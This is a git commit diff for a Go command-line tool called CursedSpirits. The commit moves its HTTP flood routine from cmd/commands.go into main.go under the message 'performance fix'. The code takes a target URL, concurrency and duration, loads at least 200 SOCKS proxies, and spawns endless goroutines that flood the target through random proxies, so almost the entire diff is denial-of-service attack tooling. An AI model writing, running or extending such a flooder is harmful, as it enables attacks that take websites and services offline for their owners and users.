53180b78c3f99c1b7d87a6b2121bca7f46dfc2a0
Efdal <00312802@rijnijssel.nl>
2023-08-23 13:07:50 +0200

    performance fix

--- cmd/commands.go
+++ cmd/commands.go
@@ -1,17 +1,11 @@
 package cmd
 
 import (
-	"Pix4Devs/CursedSpirits/bot"
-	"Pix4Devs/CursedSpirits/fancy"
-	"Pix4Devs/CursedSpirits/filesystem"
 	"Pix4Devs/CursedSpirits/globals"
 	"fmt"
 	"log"
-	"math/rand"
-	"net/http"
 	"os"
 	"path/filepath"
-	"runtime"
 	"strconv"
 	"strings"
 	"time"
@@ -25,20 +19,12 @@ var RootCmd = &cobra.Command{
 	Use: "./CursedSpirits",
 }
 
-var (
-	TARGET = &globals.TARGET
-	CONCURRENCY = &globals.CONCURRENCY
-	DURATION = &globals.DURATION
-	PROXY_TYPE = &globals.PROXY_TYPE
-	VALID_PROTOCOLS = &globals.VALID_PROTOCOLS
-)
-
 var SubCommands = []*cobra.Command{
 	{
 		Use: "start",
 		Short: "Starts the flood",
 		Run: func(cmd *cobra.Command, args []string) {
-			startFlood()
+			return //continue
 		},
 	},
 	{
@@ -62,13 +48,13 @@ func Init(){
 	RootCmd.AddCommand(SubCommands...)
 	{
 		// FLAGS for command 'start'
-		SubCommands[0].Flags().StringVar(TARGET,"url","","Sets target URL, requires http:// or https:// scheme included!")
+		SubCommands[0].Flags().StringVar(&globals.TARGET,"url","","Sets target URL, requires http:// or https:// scheme included!")
 		SubCommands[0].MarkFlagRequired("url")
 
 		{
-			SubCommands[0].Flags().IntVar(CONCURRENCY,"concurrency",2000,"Set concurrency accross requests")
-			SubCommands[0].Flags().IntVar(DURATION,"duration",300,"Sets flood duration in seconds")
-			SubCommands[0].Flags().StringVar(PROXY_TYPE,"protocol","socks4","Sets proxy type, can be one of socks4 or socks5")
+			SubCommands[0].Flags().IntVar(&globals.CONCURRENCY,"concurrency",2000,"Set concurrency accross requests")
+			SubCommands[0].Flags().IntVar(&globals.DURATION,"duration",300,"Sets flood duration in seconds")
+			SubCommands[0].Flags().StringVar(&globals.PROXY_TYPE,"protocol","socks4","Sets proxy type, can be one of socks4 or socks5")
 		}
 		
 		// FLAGS for command 'scrape'
@@ -86,69 +72,6 @@ func Init(){
 				strings.Replace(proxyscraper.API,"v2/?request=displayproxies&protocol=all&timeout=10000&country=all&ssl=all&anonymity=all","",1))
 			},
 		})
-	}
-}
-
-func startFlood(){
-	if !strings.Contains(*TARGET, "http://") && !strings.Contains(*TARGET, "https://") {
-		log.Fatal("http:// or https:// scheme required for 'url' option, see <bin> -help for more info")
-	}
-
-	var valid bool
-	ref := *VALID_PROTOCOLS
-
-	for i := 0; i < len(ref); i++ {
-		if ref[i] == *PROXY_TYPE {
-			valid = true
-			break
-		}
-	}
-	
-	if !valid {
-		log.Fatal("Proxy protocol can be only socks4 or socks5, see <bin> -help for more info")
-	}
-	
-	cores := runtime.NumCPU()
-	runtime.GOMAXPROCS(cores)
-
-	base, err := os.Getwd(); if err != nil {
-		log.Fatal(err)
-	}
-
-	fileEntry := map[string]interface{}{
-		"accepts.txt": &globals.ACCEPTS,
-		"proxies.txt": &globals.PROXIES,
-		"refs.txt":    &globals.REFS,
-	}
-
-	for k, v := range fileEntry {
-		data := filesystem.Read(filepath.Join(base,"context",k))
-		*v.(*[]string) = data
-	}
-
-	v, _ := fileEntry["proxies.txt"].(*[]string)
-	if(len(*v) < 200) {
-		log.Fatal("Requires minimum of 200 proxies")
-	}
-
-	f := &bot.FloodCtx{
-		Target: *TARGET,
-		Concurrency: *CONCURRENCY,
-		StopAt: int(time.Now().Add(time.Second * time.Duration(*DURATION)).Unix()),
-		Client: &http.Client{
-			Jar: http.DefaultClient.Jar,
-			Timeout: time.Duration(time.Second * 20),
-		},
-		Protocol: *PROXY_TYPE,
-	}
-
-	fancy.PrintCtx("Started flood against '" + *TARGET + "'")
-	fmt.Println()
-
-	for {
-		go func(){
-			f.Jujutsu(globals.PROXIES[rand.Intn(len(globals.PROXIES))])
-		}()
 	}
 }
 
--- main.go
+++ main.go
@@ -1,10 +1,28 @@
 package main
 
 import (
+	"Pix4Devs/CursedSpirits/bot"
 	"Pix4Devs/CursedSpirits/cmd"
 	"Pix4Devs/CursedSpirits/fancy"
+	"Pix4Devs/CursedSpirits/filesystem"
+	"Pix4Devs/CursedSpirits/globals"
 	"fmt"
 	"log"
+	"math/rand"
+	"net/http"
+	"os"
+	"path/filepath"
+	"runtime"
+	"strings"
+	"time"
+)
+
+var (
+	TARGET = &globals.TARGET
+	CONCURRENCY = &globals.CONCURRENCY
+	DURATION = &globals.DURATION
+	PROXY_TYPE = &globals.PROXY_TYPE
+	VALID_PROTOCOLS = &globals.VALID_PROTOCOLS
 )
 
 func main() {
@@ -16,5 +34,66 @@ func main() {
 	cmd.Init()
 	if err := cmd.RootCmd.Execute(); err != nil {
 		log.Fatal(err)
+	}
+
+	if !strings.Contains(*TARGET, "http://") && !strings.Contains(*TARGET, "https://") {
+		log.Fatal("http:// or https:// scheme required for 'url' option, see <bin> -help for more info")
+	}
+
+	var valid bool
+	ref := *VALID_PROTOCOLS
+
+	for i := 0; i < len(ref); i++ {
+		if ref[i] == *PROXY_TYPE {
+			valid = true
+			break
+		}
+	}
+	
+	if !valid {
+		log.Fatal("Proxy protocol can be only socks4 or socks5, see <bin> -help for more info")
+	}
+	
+	cores := runtime.NumCPU()
+	runtime.GOMAXPROCS(cores)
+
+	base, err := os.Getwd(); if err != nil {
+		log.Fatal(err)
+	}
+
+	fileEntry := map[string]interface{}{
+		"accepts.txt": &globals.ACCEPTS,
+		"proxies.txt": &globals.PROXIES,
+		"refs.txt":    &globals.REFS,
+	}
+
+	for k, v := range fileEntry {
+		data := filesystem.Read(filepath.Join(base,"context",k))
+		*v.(*[]string) = data
+	}
+
+	v, _ := fileEntry["proxies.txt"].(*[]string)
+	if(len(*v) < 200) {
+		log.Fatal("Requires minimum of 200 proxies")
+	}
+
+	f := &bot.FloodCtx{
+		Target: *TARGET,
+		Concurrency: *CONCURRENCY,
+		StopAt: int(time.Now().Add(time.Second * time.Duration(*DURATION)).Unix()),
+		Client: &http.Client{
+			Jar: http.DefaultClient.Jar,
+			Timeout: time.Duration(time.Second * 20),
+		},
+		Protocol: *PROXY_TYPE,
+	}
+
+	fancy.PrintCtx("Started flood against '" + *TARGET + "'")
+	fmt.Println()
+
+	for {
+		go func(){
+			f.Jujutsu(globals.PROXIES[rand.Intn(len(globals.PROXIES))])
+		}()
 	}
 }
